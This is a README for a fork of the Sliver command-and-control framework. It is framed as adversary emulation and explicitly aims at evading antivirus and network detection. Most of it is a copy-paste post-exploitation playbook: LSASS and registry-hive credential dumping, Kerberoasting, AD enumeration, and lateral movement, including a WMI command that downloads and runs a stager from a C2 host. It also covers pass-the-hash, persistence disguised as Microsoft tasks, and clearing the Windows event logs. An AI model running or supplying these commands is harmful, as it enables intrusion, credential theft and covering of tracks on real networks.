# mgstate/sliver — Enhanced Adversary Emulation Framework

Enhanced fork of [BishopFox/sliver](https://github.com/BishopFox/sliver) with fixed SOCKS proxy, one-command RDP, reliable token impersonation, Harriet AV/EDR bypass integration, opsec C2 profiles, and network signature removal.

## What's New in This Fork

### New Commands
| Command | Description |
|---------|-------------|
| `rdp` | One-command RDP — auto port-forward + launches mstsc/xfreerdp |
| `steal-token PID` | Steal token by PID — resolves process owner automatically |
| `quick-impersonate` | Impersonate via creds (`-u/-p/-d`), PID (`-P`), or with exec (`-e`) |
| `harriet` | Generate AES-encrypted, code-signed payloads via Harriet loader |

### Fixed SOCKS Proxy (RDP/High-Bandwidth Works)
Upstream SOCKS proxy was unusable for RDP and high-bandwidth protocols:
- Removed 10ms sleep on every Read/Write/Close in implant tunnel handler
- Buffers: 4KB→64KB (client), 100→512 (channels)
- Rate limit: 10→50000 ops/s
- Inactivity timeout: 15s→120s (RDP idles for minutes)
- TCP keepalive + NoDelay on connections
- Non-blocking send prevents deadlock on saturated tunnels

### Fixed Token Impersonation
Upstream `impersonate` compared `proc.Owner()` (returns `"DOMAIN\username"`) with exact match — so `"admin"` never matched `"CORP\admin"`. Fixed with 3-tier matching: exact → case-insensitive → domain\user suffix.

### Network Signature Removal
Known Sliver network IOCs changed:
- Yamux magic bytes: `"MUX/1"` → `"HSK/2"`
- Envelope signing prefix: `"env-signing-v1:"` → `"tls-auth-seed:"`

### Opsec C2 Profiles
Pre-built HTTP traffic mimicry profiles in `opsec-profiles/`:
- **cloudflare** — CDN static asset fetches (CF-RAY, CF-Cache-Status headers)
- **microsoft365** — M365/Azure AD OAuth traffic (Edge UA, ESTS cookies)
- **slack** — Slack Web API calls (conversations.history, chat.postMessage)

### Harriet Integration
Built-in command wraps shellcode with [Harriet](https://github.com/assume-breach/Home-Grown-Red-Team/tree/main/Harriet) AES-encrypted loader using Harriet's native `EXE.sh`/`DLL.sh` build scripts. 5 execution methods: `directsyscall`, `queueapc`, `nativeapi`, `inject`, `aes`. EXE or DLL output.

---

## Quick Start

### Automated Setup (Kali/Ubuntu)
```bash
git clone https://github.com/mgstate/sliver.git ~/sliver
cd ~/sliver
bash setup.sh
```

This installs Go, MinGW, Harriet, builds Sliver, and creates helper scripts.

### Manual Build
```bash
# Prerequisites: Go 1.25+, MinGW (for Harriet)
sudo apt install -y mingw-w64 osslsigncode python3-pycryptodome
git clone https://github.com/mgstate/sliver.git ~/sliver
cd ~/sliver && make
```

### Start Server
```bash
./sliver-server
```

### Import C2 Profiles
```
sliver > c2profiles import -n cloudflare -f opsec-profiles/cloudflare-cdn-c2.json
sliver > c2profiles import -n microsoft365 -f opsec-profiles/microsoft365-c2.json
sliver > c2profiles import -n slack -f opsec-profiles/slack-api-c2.json
```

### Start Listeners
```
sliver > mtls --lhost 0.0.0.0 --lport 8888
sliver > https --lhost 0.0.0.0 --lport 443 -d cdn.yourdomain.com
```

### Generate Implant
```
sliver > generate beacon \
  --mtls YOUR_IP:8888 \
  --http https://cdn.yourdomain.com \
  --os windows --arch amd64 \
  --format shellcode --evasion \
  --c2profile cloudflare \
  --seconds 60 --jitter 30 \
  --strategy r --save /tmp/beacon.bin
```

### Wrap with Harriet
```
sliver > harriet \
  --shellcode /tmp/beacon.bin \
  --method directsyscall \
  --format exe \
  --output /tmp/implant.exe \
  --harriet-path /opt/Home-Grown-Red-Team/Harriet
```

### Post-Exploitation
```
sliver (IMPLANT) > steal-token 1234              # Steal token by PID
sliver (IMPLANT) > quick-impersonate -u admin -p Pass -d CORP -e "whoami /all"
sliver (IMPLANT) > rdp -u admin -p Pass           # One-command RDP
sliver (IMPLANT) > socks5 start -p 1080           # SOCKS proxy (RDP works)
sliver (IMPLANT) > rev2self                        # Revert impersonation
```

---

## Post-Exploitation Playbook

### Install BOF Extensions (One-Time)

Sliver's armory provides BOFs (Beacon Object Files) that run in-process — no exe dropped to disk.

```
sliver > armory                                    # List all available extensions
sliver > armory install sa-whoami                   # AD user/group enumeration
sliver > armory install sa-netlocalgroup            # Local group membership
sliver > armory install nanodump                    # LSASS memory dump
sliver > armory install bof-credentials             # Credential harvesting BOFs
sliver > armory install bof-registry                # Registry operations
sliver > armory install sharp-hound-4               # BloodHound collection
```

### Credential Dumping — LSA Secrets & SAM

**Requires:** High integrity (Run as Administrator)

```
# ─── Dump LSASS with nanodump (most evasive) ───
sliver (IMPLANT) > nanodump -w C:\Windows\Temp\debug.dmp
# Download the dump, then on Kali: pypykatz lsa minidump debug.dmp

# ─── SAM + SECURITY + SYSTEM hive extraction ───
sliver (IMPLANT) > execute -o reg save HKLM\SAM C:\Windows\Temp\sam
sliver (IMPLANT) > execute -o reg save HKLM\SECURITY C:\Windows\Temp\security
sliver (IMPLANT) > execute -o reg save HKLM\SYSTEM C:\Windows\Temp\system
sliver (IMPLANT) > download C:\Windows\Temp\sam
sliver (IMPLANT) > download C:\Windows\Temp\security
sliver (IMPLANT) > download C:\Windows\Temp\system
# On Kali: secretsdump.py -sam sam -security security -system system LOCAL

# ─── In-memory with execute-assembly (SharpSecDump) ───
sliver (IMPLANT) > execute-assembly /opt/tools/SharpSecDump.exe -target=localhost
# Dumps SAM, LSA secrets, and cached domain creds — no files touch disk

# ─── LSA Whisper — extract LSA secrets via BOF ───
sliver (IMPLANT) > sa-netlocalgroup                 # Enumerate local admins first
sliver (IMPLANT) > execute-assembly /opt/tools/SharpLSA.exe       # Dump LSA secrets
# Or use mimikatz BOF:
sliver (IMPLANT) > execute -o "cmd.exe /c rundll32.exe" -ppid 5056  # Under svchost
```

### Kerberoasting

**Requires:** Domain-joined machine, any domain user token

```
# ─── Rubeus Kerberoast (execute-assembly, runs in-memory) ───
sliver (IMPLANT) > execute-assembly /opt/tools/Rubeus.exe kerberoast /outfile:C:\Windows\Temp\hashes.txt
sliver (IMPLANT) > download C:\Windows\Temp\hashes.txt
# On Kali: hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

# ─── Rubeus Kerberoast — specific high-value SPNs ───
sliver (IMPLANT) > execute-assembly /opt/tools/Rubeus.exe kerberoast /spn:MSSQLSvc/db01.corp.local:1433
sliver (IMPLANT) > execute-assembly /opt/tools/Rubeus.exe kerberoast /user:svc_sql /nowrap
# /nowrap gives you a single-line hash — easier to copy

# ─── AS-REP Roasting (no pre-auth accounts) ───
sliver (IMPLANT) > execute-assembly /opt/tools/Rubeus.exe asreproast /format:hashcat /outfile:C:\Windows\Temp\asrep.txt
sliver (IMPLANT) > download C:\Windows\Temp\asrep.txt
# On Kali: hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# ─── Targeted: find kerberoastable accounts first ───
sliver (IMPLANT) > execute-assembly /opt/tools/Rubeus.exe kerberoast /stats
# Shows all accounts with SPNs, encryption type, and password last set
# Target accounts with RC4 (type 23) — faster to crack than AES
```

### AD Enumeration

```
# ─── BloodHound collection (in-memory) ───
sliver (IMPLANT) > sharp-hound-4 -- -c All --outputdirectory C:\Windows\Temp --zipfilename bh.zip
sliver (IMPLANT) > download C:\Windows\Temp\bh.zip
# Import into BloodHound GUI — find shortest path to DA

# ─── Quick AD recon via BOFs ───
sliver (IMPLANT) > sa-whoami                        # Current user + group memberships
sliver (IMPLANT) > sa-netlocalgroup Administrators   # Who is local admin?
sliver (IMPLANT) > execute -o "net group \"Domain Admins\" /domain"
sliver (IMPLANT) > execute -o "nltest /dclist:corp.local"
sliver (IMPLANT) > execute -o "nltest /domain_trusts"
```

### Lateral Movement

```
# ─── PsExec (built-in, drops a service binary) ───
sliver (IMPLANT) > psexec -t TARGET_IP -s /tmp/beacon.bin
# Uses named pipe pivot — new session calls back through current implant

# ─── WMI Execution (fileless) ───
sliver (IMPLANT) > execute-assembly /opt/tools/SharpWMI.exe action=exec computername=TARGET command="powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://C2_IP/stager.ps1')"

# ─── SMB Named Pipe Pivot (no new outbound connection) ───
# Generate a pivot implant:
sliver > generate beacon --named-pipe TARGET --os windows --arch amd64 --format shellcode --save /tmp/pivot.bin
# Then from existing session:
sliver (IMPLANT) > psexec -t TARGET_IP -s /tmp/pivot.bin
# New beacon routes through the existing session's tunnel

# ─── Token Impersonation + Lateral ───
sliver (IMPLANT) > steal-token 1234                 # Steal DA token from process
sliver (IMPLANT) > execute -o "dir \\\\DC01\\C$"     # Verify access
sliver (IMPLANT) > psexec -t DC01 -s /tmp/beacon.bin  # Move to DC

# ─── RDP via SOCKS proxy ───
sliver (IMPLANT) > socks5 start -p 1080
# On Kali: proxychains xfreerdp /v:TARGET /u:admin /p:Password123 /cert-ignore
# Or use the built-in rdp command:
sliver (IMPLANT) > rdp -u admin -p Password123 --target TARGET_IP

# ─── Pass-the-Hash with Rubeus + Over-Pass-the-Hash ───
sliver (IMPLANT) > execute-assembly /opt/tools/Rubeus.exe asktgt /user:admin /rc4:NTLM_HASH /ptt
sliver (IMPLANT) > execute -o "dir \\\\DC01\\C$"     # Now works with the injected ticket

# ─── Azure RunCommand (for Azure VMs — no agent needed) ───
# See AZURE-KILLCHAIN.md for the full guide
# Quick version from Kali:
./deploy-runcommand.sh --token ARM_TOKEN --sub SUB_ID --rg RG --vm VM --implant-url http://C2/implant.exe
```

### Persistence

```
# ─── Scheduled Task ───
sliver (IMPLANT) > execute -o schtasks /create /tn "Microsoft\Windows\NetTrace\DiagCheck" /tr "C:\ProgramData\Microsoft\Network\svchost.exe" /sc onstart /ru SYSTEM /f

# ─── Registry Run Key ───
sliver (IMPLANT) > execute -o reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v DiagTrack /t REG_SZ /d "C:\ProgramData\Microsoft\Network\svchost.exe" /f

# ─── WMI Event Subscription (survives reboots, no files in startup) ───
sliver (IMPLANT) > execute-assembly /opt/tools/SharpStay.exe action=WMIEvent eventname=DiagCheck command="C:\ProgramData\Microsoft\Network\svchost.exe"
```

### Cleanup

```
sliver (IMPLANT) > rev2self                         # Revert impersonation
sliver (IMPLANT) > execute -o schtasks /delete /tn "Microsoft\Windows\NetTrace\DiagCheck" /f
sliver (IMPLANT) > execute -o reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v DiagTrack /f
sliver (IMPLANT) > rm C:\ProgramData\Microsoft\Network\svchost.exe
sliver (IMPLANT) > rm C:\Windows\Temp\*.dmp
sliver (IMPLANT) > rm C:\Windows\Temp\hashes.txt
sliver (IMPLANT) > execute -o "wevtutil cl Security"
sliver (IMPLANT) > execute -o "wevtutil cl System"
sliver (IMPLANT) > exit                              # Kill the beacon
```

### Tool Setup (Kali)

Download the .NET assemblies used above:
```bash
# Rubeus (Kerberoast, pass-the-hash, ticket ops)
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe -O /opt/tools/Rubeus.exe

# SharpSecDump (SAM + LSA + cached creds)
wget https://github.com/G0ldenGunSec/SharpSecDump/releases/latest/download/SharpSecDump.exe -O /opt/tools/SharpSecDump.exe

# SharpHound (BloodHound collector)
wget https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHound.exe -O /opt/tools/SharpHound.exe

# SharpWMI (WMI lateral movement)
wget https://github.com/GhostPack/SharpWMI/raw/master/SharpWMI/bin/Release/SharpWMI.exe -O /opt/tools/SharpWMI.exe

# Impacket (secretsdump, psexec, wmiexec from Kali)
pip3 install impacket
```

---

## Documentation

| Guide | Description |
|-------|-------------|
| [OPSEC-GUIDE.md](OPSEC-GUIDE.md) | Full step-by-step: build, profiles, listeners, implant generation, Harriet wrapping, deployment, post-exploitation, cleanup |
| [AZURE-KILLCHAIN.md](AZURE-KILLCHAIN.md) | Azure RunCommand lateral movement kill chain — proven engagement guide with Meatball C2 + Sliver C2 |

## Helper Scripts

| Script | Description |
|--------|-------------|
| `setup.sh` | Automated setup — installs deps, builds Sliver, sets up Harriet |
| `start.sh` | Generated by setup — launches server with profile import hints |
| `gen-implant.sh` | Generated by setup — one-command beacon + Harriet wrapping |
| `deploy-runcommand.sh` | Generated by setup — deploys implant to Azure VM via RunCommand v2 |

---

## Files Changed From Upstream

```
client/command/harriet/               # NEW — Harriet integration
client/command/rdp/                   # NEW — One-command RDP
client/command/privilege/steal-token.go    # REWRITTEN — PID-based token theft
client/command/privilege/quick-impersonate.go  # NEW — Enhanced impersonation
client/core/socks.go                  # FIXED — 64KB buffer, 50k rate limit
implant/sliver/handlers/tunnel_handlers/socks_handler.go  # FIXED — Sleep removal
implant/sliver/priv/priv_windows.go   # FIXED — 3-tier impersonation matching
implant/sliver/transports/mtls/mtls.go  # CHANGED — Network signatures
server/c2/mtls.go                     # CHANGED — Matching server signatures
server/rpc/rpc-socks.go              # TUNED — Buffer/timeout for high-bandwidth
opsec-profiles/                       # NEW — 3 C2 traffic profiles
setup.sh                              # NEW — Automated setup script
```

---

## Upstream

Based on [BishopFox/sliver](https://github.com/BishopFox/sliver) — open source adversary emulation framework. C2 over mTLS, WireGuard, HTTP(S), and DNS. Dynamic code generation, compile-time obfuscation, in-memory .NET assembly execution, COFF/BOF loader, TCP/named pipe pivots.

See the upstream [wiki](https://sliver.sh/) for base Sliver documentation.

### License — GPLv3

Sliver is licensed under [GPLv3](https://www.gnu.org/licenses/gpl-3.0.en.html). Some sub-components may have separate licenses.
